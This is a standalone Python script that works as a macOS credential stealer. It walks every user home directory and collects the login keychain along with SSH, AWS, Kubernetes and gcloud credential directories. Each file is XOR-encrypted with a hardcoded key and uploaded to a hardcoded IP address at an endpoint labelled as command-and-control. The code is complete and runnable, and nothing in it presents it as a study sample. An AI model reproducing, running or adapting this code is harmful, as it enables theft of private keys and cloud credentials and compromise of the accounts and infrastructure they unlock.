import os
import requests
from pathlib import Path

SESSION_ID = "session1234"
XOR_KEY     = b"mysecretpassword"
C2_UPLOAD   = "http://34.218.60.251:1337/upload"
#home = os.path.expanduser("~")

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def send_file(session_id: str, filepath: str):
    p = Path(filepath)
    if not p.is_file():
        # This function already skips missing files, but the new logic in get_info()
        # will prevent this from even being called for non-existent paths.
        print(f"[!] skipping missing file: {filepath}")
        return

    raw = p.read_bytes()
    enc = xor_encrypt(raw, XOR_KEY)
    files = {"file": (p.name, enc)}
    data  = {"session_id": session_id}
    resp = requests.post(C2_UPLOAD, files=files, data=data)
    resp.raise_for_status()
    print(f"[+] uploaded {filepath}")

def send_directory(session_id: str, alias: str, dirpath: str, recursive: bool=True):
    root = Path(dirpath)
    if not root.is_dir():
        # This function already skips missing directories.
        print(f"[!] skipping missing directory: {dirpath}")
        return

    walker = root.rglob("*") if recursive else root.glob("*")
    for path in walker:
        if path.is_file():
            send_file(f"{session_id}-{alias}", str(path))

def get_info():
    """Scan every /Users/<user>/ for interesting paths and upload them."""
    if not SESSION_ID:      # nothing to do without a session
        return

    # iterate over each directory immediately under /Users (correct for macOS)
    for user_dir in Path("/Users").iterdir(): #change /home(linux/docker) to /Users(macos) depending upon env.
        if not user_dir.is_dir():
            continue
        
        # Skip directories that are not typical user homes
        if user_dir.name in ["Shared", "Guest"]:
            continue

        home = str(user_dir)
        print(f"→ Scanning {home}")

        # --- Define paths to check ---
        keychain_path = os.path.join(home, "Library", "Keychains", "login.keychain-db")
        ssh_dir       = os.path.join(home, ".ssh")
        aws_dir       = os.path.join(home, ".aws")
        kube_dir      = os.path.join(home, ".kube")
        gcloud_dir    = os.path.join(home, ".config", "gcloud")
        test_dir      = os.path.join(home, "test")

        # --- ADDED: Check for file existence before calling send_file ---
        if os.path.isfile(keychain_path):
            send_file(SESSION_ID, keychain_path)
        
        # --- ADDED: Check for directory existence before calling send_directory ---
        if os.path.isdir(ssh_dir):
            send_directory(SESSION_ID, "ssh", ssh_dir, True)
            
        if os.path.isdir(aws_dir):
            send_directory(SESSION_ID, "aws", aws_dir, True)
            
        if os.path.isdir(kube_dir):
            send_directory(SESSION_ID, "kube", kube_dir, True)

        if os.path.isdir(gcloud_dir):
            send_directory(SESSION_ID, "gcloud", gcloud_dir, True)

        if os.path.isdir(test_dir):
            send_directory(SESSION_ID, "test", test_dir, True)


if __name__ == "__main__":
    get_info()